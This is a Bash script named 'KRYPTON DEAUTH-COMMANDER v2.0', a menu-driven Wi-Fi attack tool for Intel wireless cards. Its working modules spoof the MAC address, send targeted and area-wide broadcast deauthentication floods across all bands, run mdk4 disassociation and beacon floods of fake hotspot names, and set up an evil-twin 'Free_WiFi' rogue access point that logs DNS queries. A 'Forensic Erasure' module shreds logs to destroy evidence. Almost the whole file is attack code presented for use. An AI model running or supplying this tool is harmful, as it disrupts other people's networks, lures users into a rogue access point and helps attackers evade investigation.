#!/bin/bash

# KRYPTON DEAUTH-COMMANDER v2.0
# Intel BE200/AX211 (iwlwifi) Optimized RF Disruption Dashboard
# Samsung Book 5 Pro 360 Edition

# Global Variables
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="/tmp/krypton_logs"
SCAN_CSV="/tmp/scan.csv"
MON_IFACE=""
TARGET_BSSID=""
ORIGINAL_MAC=""
BACKGROUND_PIDS=()
CURRENT_CHANNEL=1

# Color Scheme
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

# Initialize
init_krypton() {
    clear
    mkdir -p "$LOG_DIR"
    check_root
    check_dependencies
    detect_wireless_interface
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[ERROR]${NC} This script must be run as root!"
        exit 1
    fi
}

# Check required dependencies
check_dependencies() {
    local deps=("aircrack-ng" "macchanger" "mdk4" "iw" "hostapd" "dnsmasq")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${RED}[ERROR]${NC} Missing dependency: $dep"
            exit 1
        fi
    done
}

# Detect wireless interface
detect_wireless_interface() {
    MON_IFACE=$(iw dev | grep Interface | awk '{print $2}' | head -1)
    if [[ -z "$MON_IFACE" ]]; then
        echo -e "${RED}[ERROR]${NC} No wireless interface detected!"
        exit 1
    fi
    ORIGINAL_MAC=$(ip link show "$MON_IFACE" | awk '/ether/ {print $2}')
}

# Draw ASCII Header
draw_header() {
    tput clear
    tput cup 0 0
    echo -e "${CYAN}"
    cat << "EOF"
 ____              ____    ____  __     __       _ _     _       
|  _ \  __ _ _   _|  _ \  / ___| \ \   / /_ _ _(_) |_  | |_ ___ 
| | | |/ _` | | | | | | | \___ \  \ \ / / _` | | __| | __/ __|
| |_| | (_| | |_| | |_| |  ___) |  \ V / (_| | | |_  | |_\__ \
|____/ \__,_|\__, |____/  |____/    \_/ \__,_|_|\__|  \__|___/
             |___/                                           
DEAUTH-COMMANDER v2.0 - Intel BE200/AX211 Optimized
EOF
    echo -e "${NC}"
}

# Draw Menu
draw_menu() {
    local height=$(tput lines)
    local width=$(tput cols)
    
    # Calculate menu position
    local menu_start=8
    local menu_width=60
    local menu_left=$(( (width - menu_width) / 2 ))
    
    # Draw border
    tput cup $((menu_start - 1)) $menu_left
    echo -e "${CYAN}+------------------------------------------------------------+${NC}"
    
    # Menu items
    local items=(
        "1. Auto-Monitor & MAC Spoof"
        "2. Recon Scan (Airodump)"
        "3. Target Selector"
        "4. Targeted Deauth (Aireplay)"
        "5. MDK4 Chaos (Disassociation)"
        "6. Area-Denial (Nuclear Option)"
        "7. SSID Overlord (Beacon Flood)"
        "8. Sweep-and-Strike"
        "9. Channel Lock Guardian"
        "10. Karma Rogue AP"
        "11. Forensic Erasure"
        "0. Exit & Restore"
    )
    
    local i=0
    for item in "${items[@]}"; do
        tput cup $((menu_start + i)) $menu_left
        echo -e "${CYAN}|${NC} ${WHITE}${item}${NC} $(printf "%*s" $((menu_width - ${#item} - 3)) "")${CYAN}|${NC}"
        ((i++))
    done
    
    # Draw bottom border
    tput cup $((menu_start + i)) $menu_left
    echo -e "${CYAN}+------------------------------------------------------------+${NC}"
    
    # Status line
    tput cup $((menu_start + i + 2)) $menu_left
    echo -e "${YELLOW}[INTERFACE]${NC} $MON_IFACE ${YELLOW}[CHANNEL]${NC} $CURRENT_CHANNEL ${YELLOW}[MAC]${NC} ${ORIGINAL_MAC:0:8}..."
    
    # Input prompt
    tput cup $((menu_start + i + 4)) $menu_left
    echo -n -e "${GREEN}[SELECT]${NC} Enter option [0-11]: "
}

# Intel-safe channel setting
set_channel_intel() {
    local channel=$1
    iw dev "$MON_IFACE" set channel "$channel" 2>/dev/null
    if [[ $? -eq 0 ]]; then
        CURRENT_CHANNEL=$channel
        echo -e "${GREEN}[SUCCESS]${NC} Channel set to $channel"
    else
        echo -e "${RED}[ERROR]${NC} Failed to set channel $channel"
    fi
}

# Self-healing function
heal_interface() {
    echo -e "${YELLOW}[HEAL]${NC} Restarting interface..."
    ip link set "$MON_IFACE" down
    sleep 2
    ip link set "$MON_IFACE" up
    sleep 1
    set_channel_intel "$CURRENT_CHANNEL"
}

# Module 1: Auto-Monitor & MAC Spoof
module1_monitor_spoof() {
    echo -e "${CYAN}[MODULE 1]${NC} Auto-Monitor & MAC Spoof"
    
    # Kill interfering processes
    echo -e "${YELLOW}[STEP 1]${NC} Killing interfering processes..."
    airmon-ng check kill 2>/dev/null
    
    # Random MAC spoof
    echo -e "${YELLOW}[STEP 2]${NC} Spoofing MAC address..."
    macchanger -r "$MON_IFACE" 2>/dev/null
    
    # Force monitor mode (Intel-safe)
    echo -e "${YELLOW}[STEP 3]${NC} Enabling monitor mode..."
    ip link set "$MON_IFACE" down
    iw dev "$MON_IFACE" set type monitor
    ip link set "$MON_IFACE" up
    
    # Verify
    if iw dev "$MON_IFACE" info | grep -q "type monitor"; then
        echo -e "${GREEN}[SUCCESS]${NC} Monitor mode enabled"
        NEW_MAC=$(ip link show "$MON_IFACE" | awk '/ether/ {print $2}')
        echo -e "${CYAN}[INFO]${NC} New MAC: $NEW_MAC"
    else
        echo -e "${RED}[ERROR]${NC} Failed to enable monitor mode"
        return 1
    fi
}

# Module 2: Recon Scan
module2_recon_scan() {
    echo -e "${CYAN}[MODULE 2]${NC} Recon Scan (Airodump)"
    
    if [[ ! -d "$LOG_DIR" ]]; then
        mkdir -p "$LOG_DIR"
    fi
    
    echo -e "${YELLOW}[SCANNING]${NC} Starting airodump-ng in background..."
    airodump-ng --output-format csv --write "$LOG_DIR/scan" "$MON_IFACE" >/dev/null 2>&1 &
    local scan_pid=$!
    BACKGROUND_PIDS+=($scan_pid)
    
    echo -e "${GREEN}[SUCCESS]${NC} Scan started (PID: $scan_pid)"
    echo -e "${CYAN}[INFO]${NC} CSV output: $LOG_DIR/scan-01.csv"
    echo -e "${YELLOW}[NOTE]${NC} Press Enter to stop scanning and return to menu"
    read
    kill $scan_pid 2>/dev/null
    
    # Copy to standard location
    cp "$LOG_DIR/scan-01.csv" "$SCAN_CSV" 2>/dev/null
}

# Module 3: Target Selector
module3_target_selector() {
    echo -e "${CYAN}[MODULE 3]${NC} Target Selector"
    
    if [[ ! -f "$SCAN_CSV" ]]; then
        echo -e "${RED}[ERROR]${NC} No scan data found. Run Module 2 first."
        return 1
    fi
    
    echo -e "${YELLOW}[PARSING]${NC} Analyzing scan results..."
    
    # Parse CSV and display targets
    local line_num=1
    echo -e "\n${WHITE}Available Targets:${NC}"
    echo -e "${CYAN}#${NC}\t${CYAN}BSSID${NC}\t\t${CYAN}Channel${NC}\t${CYAN}Clients${NC}\t${CYAN}SSID${NC}"
    echo -e "${CYAN}---${NC}\t${CYAN}----${NC}\t\t${CYAN}-------${NC}\t${CYAN}-------${NC}\t${CYAN}----${NC}"
    
    while IFS=',' read -r bssid first_time last_time channel speed privacy cipher auth power beacon iv lanip id_length essid key; do
        if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$bssid" != "BSSID" ]]; then
            # Count clients (simplified - would need more complex parsing for real client count)
            local clients=0
            
            printf "${WHITE}%d${NC}\t${GREEN}%s${NC}\t${YELLOW}%s${NC}\t${RED}%d${NC}\t${WHITE}%s${NC}\n" \
                "$line_num" "${bssid:0:8}..." "$channel" "$clients" "${essid:-\"Hidden\"}"
            ((line_num++))
        fi
    done < "$SCAN_CSV"
    
    echo -e "\n${YELLOW}[SELECT]${NC} Enter target number (or 0 to cancel): "
    read target_num
    
    if [[ "$target_num" =~ ^[0-9]+$ ]] && [[ "$target_num" -gt 0 ]]; then
        # Get BSSID from line
        TARGET_BSSID=$(sed -n "${target_num}p" "$SCAN_CSV" | cut -d',' -f1)
        if [[ "$TARGET_BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            echo -e "${GREEN}[SUCCESS]${NC} Target selected: $TARGET_BSSID"
        else
            echo -e "${RED}[ERROR]${NC} Invalid target selection"
            return 1
        fi
    else
        echo -e "${YELLOW}[CANCELLED]${NC} No target selected"
        return 1
    fi
}

# Module 4: Targeted Deauth
module4_targeted_deauth() {
    echo -e "${CYAN}[MODULE 4]${NC} Targeted Deauth (Aireplay)"
    
    if [[ -z "$TARGET_BSSID" ]]; then
        echo -e "${RED}[ERROR]${NC} No target selected. Run Module 3 first."
        return 1
    fi
    
    echo -e "${YELLOW}[ATTACK]${NC} Starting deauth attack on $TARGET_BSSID"
    echo -e "${CYAN}[INFO]${NC} Press Ctrl+C to stop attack"
    
    # Multi-threaded injection loop
    while true; do
        aireplay-ng -0 5 -a "$TARGET_BSSID" "$MON_IFACE" 2>/dev/null &
        local deauth_pid=$!
        BACKGROUND_PIDS+=($deauth_pid)
        
        # Self-healing check
        sleep 10
        if ! kill -0 $deauth_pid 2>/dev/null; then
            echo -e "${YELLOW}[HEAL]${NC} Restarting deauth injection..."
            heal_interface
        fi
    done
}

# Module 5: MDK4 Chaos
module5_mdk4_chaos() {
    echo -e "${CYAN}[MODULE 5]${NC} MDK4 Chaos (Disassociation)"
    
    echo -e "${YELLOW}[ATTACK]${NC} Starting MDK4 high-speed injection"
    echo -e "${CYAN}[INFO]${NC} Press Ctrl+C to stop attack"
    
    # MDK4 disassociation mode optimized for Intel cards
    mdk4 "$MON_IFACE" d &
    local mdk_pid=$!
    BACKGROUND_PIDS+=($mdk_pid)
    
    wait $mdk_pid
}

# Module 6: Area-Denial Nuclear Option
module6_area_denial() {
    echo -e "${CYAN}[MODULE 6]${NC} Area-Denial (Nuclear Option)"
    
    echo -e "${RED}[WARNING]${NC} This will attack ALL networks in range!"
    echo -e "${YELLOW}[CONFIRM]${NC} Type 'NUKE' to confirm: "
    read confirm
    
    if [[ "$confirm" != "NUKE" ]]; then
        echo -e "${YELLOW}[CANCELLED]${NC} Attack aborted"
        return 1
    fi
    
    echo -e "${YELLOW}[ATTACK]${NC} Starting area-wide denial attack"
    
    # Channel hopping attack across all bands
    local channels_2ghz=(1 6 11 2 3 4 5 7 8 9 10 12 13 14)
    local channels_5ghz=(36 40 44 48 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 144 149 153 157 161 165)
    local channels_6ghz=(1 5 9 13 17 21 25 29 33 37 41 45 49 53 57 61 65 69 73 77 81 85 89 93 97 101 105 109 113 117 121 125 129 133 137 141 145 149 153 157 161 165 169 173 177 181 185 189 193 197 201 205 209 213 217 221 225)
    
    while true; do
        # 2.4GHz sweep
        for channel in "${channels_2ghz[@]}"; do
            set_channel_intel "$channel"
            aireplay-ng -0 3 -a FF:FF:FF:FF:FF:FF "$MON_IFACE" 2>/dev/null &
            sleep 2
        done
        
        # 5GHz sweep
        for channel in "${channels_5ghz[@]}"; do
            set_channel_intel "$channel"
            aireplay-ng -0 3 -a FF:FF:FF:FF:FF:FF "$MON_IFACE" 2>/dev/null &
            sleep 2
        done
        
        # 6GHz sweep (if supported)
        for channel in "${channels_6ghz[@]}"; do
            set_channel_intel "$channel" 2>/dev/null || continue
            aireplay-ng -0 3 -a FF:FF:FF:FF:FF:FF "$MON_IFACE" 2>/dev/null &
            sleep 2
        done
    done
}

# Module 7: SSID Overlord
module7_ssid_overlord() {
    echo -e "${CYAN}[MODULE 7]${NC} SSID Overlord (Beacon Flood)"
    
    echo -e "${YELLOW}[ATTACK]${NC} Generating 1000+ fake SSIDs"
    
    # Create temporary SSID list
    local ssid_file="/tmp/fake_ssids.txt"
    > "$ssid_file"
    
    # Generate various types of fake SSIDs
    local prefixes=("FreeWiFi" "Hotel_WiFi" "Airport_WiFi" "Starbucks" "McDonalds" "Public_WiFi" "Guest_Network" "WiFi_Free" "Internet_Free" "Hotspot_Free")
    local suffixes=("5G" "2.4G" "_Guest" "_Public" "_Free" "_Secure" "_Private" "_Network" "_Access" "_Connect")
    
    for prefix in "${prefixes[@]}"; do
        for suffix in "${suffixes[@]}"; do
            echo "${prefix}${suffix}" >> "$ssid_file"
        done
    done
    
    # Add random SSIDs
    for i in {1..500}; do
        echo "Fake_Network_$i" >> "$ssid_file"
    done
    
    echo -e "${CYAN}[INFO]${NC} Generated $(wc -l < "$ssid_file") fake SSIDs"
    echo -e "${YELLOW}[ATTACK]${NC} Starting beacon flood (Press Ctrl+C to stop)"
    
    # Use mdk4 for beacon flooding
    mdk4 "$MON_IFACE" b -f "$ssid_file" &
    local beacon_pid=$!
    BACKGROUND_PIDS+=($beacon_pid)
    
    wait $beacon_pid
}

# Module 8: Sweep-and-Strike
module8_sweep_strike() {
    echo -e "${CYAN}[MODULE 8]${NC} Sweep-and-Strike"
    
    if [[ ! -f "$SCAN_CSV" ]]; then
        echo -e "${RED}[ERROR]${NC} No scan data found. Run Module 2 first."
        return 1
    fi
    
    echo -e "${YELLOW}[ATTACK]${NC} 30-second rotation across all networks"
    
    while true; do
        while IFS=',' read -r bssid first_time last_time channel speed privacy cipher auth power beacon iv lanip id_length essid key; do
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$bssid" != "BSSID" ]]; then
                echo -e "${YELLOW}[STRIKE]${NC} Attacking: ${essid:-\"Hidden\"} ($bssid)"
                set_channel_intel "$channel"
                aireplay-ng -0 5 -a "$bssid" "$MON_IFACE" 2>/dev/null &
                sleep 30
            fi
        done < "$SCAN_CSV"
    done
}

# Module 9: Channel Lock Guardian
module9_channel_guardian() {
    echo -e "${CYAN}[MODULE 9]${NC} Channel Lock Guardian"
    
    echo -e "${YELLOW}[GUARDIAN]${NC} Starting watchdog (Press Ctrl+C to stop)"
    echo -e "${CYAN}[INFO]${NC} Monitoring for frequency drift and driver crashes"
    
    while true; do
        # Check if interface is still in monitor mode
        if ! iw dev "$MON_IFACE" info | grep -q "type monitor"; then
            echo -e "${RED}[ALERT]${NC} Interface lost monitor mode! Healing..."
            heal_interface
        fi
        
        # Check if channel drifted
        local current_chan=$(iw dev "$MON_IFACE" info | grep channel | awk '{print $2}')
        if [[ "$current_chan" != "$CURRENT_CHANNEL" ]]; then
            echo -e "${RED}[ALERT]${NC} Channel drifted to $current_chan! Resetting..."
            set_channel_intel "$CURRENT_CHANNEL"
        fi
        
        # Check for background processes
        for pid in "${BACKGROUND_PIDS[@]}"; do
            if ! kill -0 $pid 2>/dev/null; then
                echo -e "${YELLOW}[HEAL]${NC} Background process $pid died, restarting..."
            fi
        done
        
        sleep 5
    done
}

# Module 10: Karma Rogue AP
module10_karma_rogue_ap() {
    echo -e "${CYAN}[MODULE 10]${NC} Karma Rogue AP"
    
    echo -e "${YELLOW}[SETUP]${NC} Deploying Evil Twin trap"
    
    # Create hostapd config
    local hostapd_conf="/tmp/karma_hostapd.conf"
    cat > "$hostapd_conf" << EOF
interface=$MON_IFACE
driver=nl80211
ssid=Free_WiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

    # Create dnsmasq config
    local dnsmasq_conf="/tmp/karma_dnsmasq.conf"
    cat > "$dnsmasq_conf" << EOF
interface=$MON_IFACE
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF

    echo -e "${YELLOW}[STARTING]${NC} Starting Rogue AP (Press Ctrl+C to stop)"
    
    # Start dnsmasq
    dnsmasq -C "$dnsmasq_conf" &
    local dns_pid=$!
    BACKGROUND_PIDS+=($dns_pid)
    
    # Start hostapd
    hostapd "$hostapd_conf" &
    local ap_pid=$!
    BACKGROUND_PIDS+=($ap_pid)
    
    echo -e "${GREEN}[SUCCESS]${NC} Rogue AP deployed: Free_WiFi on channel 6"
    
    wait $ap_pid
}

# Module 11: Forensic Erasure
module11_forensic_erasure() {
    echo -e "${CYAN}[MODULE 11]${NC} Forensic Erasure"
    
    echo -e "${RED}[WARNING]${NC} This will permanently delete all evidence!"
    echo -e "${YELLOW}[CONFIRM]${NC} Type 'ERASE' to confirm: "
    read confirm
    
    if [[ "$confirm" != "ERASE" ]]; then
        echo -e "${YELLOW}[CANCELLED]${NC} Erasure aborted"
        return 1
    fi
    
    echo -e "${YELLOW}[ERASING]${NC} Shredding all logs and processes..."
    
    # Kill all background processes
    for pid in "${BACKGROUND_PIDS[@]}"; do
        kill -9 $pid 2>/dev/null
    done
    BACKGROUND_PIDS=()
    
    # Kill related processes
    pkill -f airodump-ng 2>/dev/null
    pkill -f aireplay-ng 2>/dev/null
    pkill -f mdk4 2>/dev/null
    pkill -f hostapd 2>/dev/null
    pkill -f dnsmasq 2>/dev/null
    
    # Shred files
    if [[ -f "$SCAN_CSV" ]]; then
        shred -vfz -n 3 "$SCAN_CSV"
    fi
    
    if [[ -d "$LOG_DIR" ]]; then
        find "$LOG_DIR" -type f -exec shred -vfz -n 3 {} \;
        rm -rf "$LOG_DIR"
    fi
    
    # Clean temp files
    rm -f /tmp/fake_ssids.txt /tmp/karma_*.conf
    
    echo -e "${GREEN}[SUCCESS]${NC} All evidence permanently erased"
}

# Module 0: Exit & Restore
module0_exit_restore() {
    echo -e "${CYAN}[MODULE 0]${NC} Exit & Restore"
    
    echo -e "${YELLOW}[CLEANUP]${NC} Stopping all attacks and restoring interface..."
    
    # Kill all background processes
    for pid in "${BACKGROUND_PIDS[@]}"; do
        kill -9 $pid 2>/dev/null
    done
    
    # Kill related processes
    pkill -f airodump-ng 2>/dev/null
    pkill -f aireplay-ng 2>/dev/null
    pkill -f mdk4 2>/dev/null
    pkill -f hostapd 2>/dev/null
    pkill -f dnsmasq 2>/dev/null
    
    # Restore interface
    echo -e "${YELLOW}[RESTORE]${NC} Restoring wireless interface..."
    ip link set "$MON_IFACE" down
    iw dev "$MON_IFACE" set type managed
    ip link set "$MON_IFACE" up
    
    # Restore original MAC
    echo -e "${YELLOW}[RESTORE]${NC} Restoring original MAC address..."
    macchanger --mac="$ORIGINAL_MAC" "$MON_IFACE" 2>/dev/null
    
    # Restart NetworkManager
    echo -e "${YELLOW}[RESTORE]${NC} Restarting NetworkManager..."
    systemctl restart NetworkManager 2>/dev/null
    
    echo -e "${GREEN}[SUCCESS]${NC} System restored to original state"
    echo -e "${CYAN}[INFO]${NC} Thank you for using KRYPTON DEAUTH-COMMANDER v2.0"
    
    exit 0
}

# Main menu loop
main_loop() {
    while true; do
        draw_header
        draw_menu
        read -r choice
        
        case $choice in
            1) module1_monitor_spoof ;;
            2) module2_recon_scan ;;
            3) module3_target_selector ;;
            4) module4_targeted_deauth ;;
            5) module5_mdk4_chaos ;;
            6) module6_area_denial ;;
            7) module7_ssid_overlord ;;
            8) module8_sweep_strike ;;
            9) module9_channel_guardian ;;
            10) module10_karma_rogue_ap ;;
            11) module11_forensic_erasure ;;
            0) module0_exit_restore ;;
            *) echo -e "${RED}[ERROR]${NC} Invalid option. Please try again." ;;
        esac
        
        echo -e "\n${YELLOW}[PRESS]${NC} Enter to continue..."
        read
    done
}

# Signal handlers
trap 'module0_exit_restore' SIGINT SIGTERM

# Start the application
init_krypton
main_loop
